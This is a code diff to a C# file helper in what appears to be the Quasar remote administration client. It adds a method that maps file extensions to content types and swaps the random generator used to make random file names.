@@ -1,6 +1,8 @@
 ﻿using System;
 using System.IO;
 using System.Text;
+using Quasar.Common.Enums;
+using Quasar.Common.Utilities;
 using xClient.Core.Cryptography;
 using xClient.Core.Data;
 using xClient.Core.Utilities;
@@ -10,13 +12,70 @@ namespace xClient.Core.Helper
     public static class FileHelper
     {
         private const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-        private static readonly Random _rnd = new Random(Environment.TickCount);
+        private static readonly SafeRandom Random = new SafeRandom();
+
+        public static ContentType GetContentType(string fileExtension)
+        {
+            switch (fileExtension.ToLower())
+            {
+                default:
+                    return ContentType.Blob;
+                case ".exe":
+                    return ContentType.Application;
+                case ".txt":
+                case ".log":
+                case ".conf":
+                case ".cfg":
+                case ".asc":
+                    return ContentType.Text;
+                case ".rar":
+                case ".zip":
+                case ".zipx":
+                case ".tar":
+                case ".tgz":
+                case ".gz":
+                case ".s7z":
+                case ".7z":
+                case ".bz2":
+                case ".cab":
+                case ".zz":
+                case ".apk":
+                    return ContentType.Archive;
+                case ".doc":
+                case ".docx":
+                case ".odt":
+                    return ContentType.Word;
+                case ".pdf":
+                    return ContentType.Pdf;
+                case ".jpg":
+                case ".jpeg":
+                case ".png":
+                case ".bmp":
+                case ".gif":
+                case ".ico":
+                    return ContentType.Image;
+                case ".mp4":
+                case ".mov":
+                case ".avi":
+                case ".wmv":
+                case ".mkv":
+                case ".m4v":
+                case ".flv":
+                    return ContentType.Video;
+                case ".mp3":
+                case ".wav":
+                case ".pls":
+                case ".m3u":
+                case ".m4a":
+                    return ContentType.Audio;
+            }
+        }
 
         public static string GetRandomFilename(int length, string extension = "")
         {
             StringBuilder randomName = new StringBuilder(length);
             for (int i = 0; i < length; i++)
-                randomName.Append(CHARS[_rnd.Next(CHARS.Length)]);
+                randomName.Append(CHARS[Random.Next(CHARS.Length)]);
 
             return string.Concat(randomName.ToString(), extension);
         }
